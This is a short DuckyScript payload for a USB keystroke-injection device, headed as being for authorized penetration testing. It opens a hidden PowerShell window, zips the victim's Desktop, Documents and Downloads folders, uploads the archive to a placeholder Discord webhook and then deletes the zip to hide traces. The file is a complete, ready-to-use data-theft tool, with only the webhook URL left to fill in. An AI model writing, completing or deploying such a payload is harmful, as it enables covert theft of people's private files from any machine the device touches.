REM ============================================
REM Desktop/Documents ZIP -> Discord Webhook
REM FOR AUTHORIZED PENETRATION TESTING ONLY
REM ============================================

DELAY 500
GUI r
DELAY 200
STRING powershell -WindowStyle Hidden -Command "Add-Type -A System.IO.Compression.FileSystem;$z=$env:TEMP+'\loot.zip';$d=@($env:USERPROFILE+'\Desktop',$env:USERPROFILE+'\Documents',$env:USERPROFILE+'\Downloads')|Where-Object{(Test-Path $_) -and ((Get-ChildItem $_ -ErrorAction SilentlyContinue|Measure-Object).Count -gt 0)};if($d.Count -gt 0){try{$zfs=[System.IO.Compression.ZipFile]::Open($z,'Create');foreach($dir in $d){[System.IO.Compression.ZipFileExtensions]::CreateFromDirectory($dir,$zfs,(Split-Path $dir -Leaf)+'\\')}$zfs.Dispose()}catch{$null};if((Test-Path $z) -and ((Get-Item $z).Length -lt 24MB)){$w='YOUR_DISCORD_WEBHOOK_URL';$msg=@{username='File Exfil';content='Files from '+$env:COMPUTERNAME}|ConvertTo-Json -Compress;Invoke-RestMethod $w -Method Post -ContentType 'application/json' -Body $msg;Invoke-RestMethod $w -Method Post -Form @{file=Get-Item $z}};Remove-Item $z -Force}"
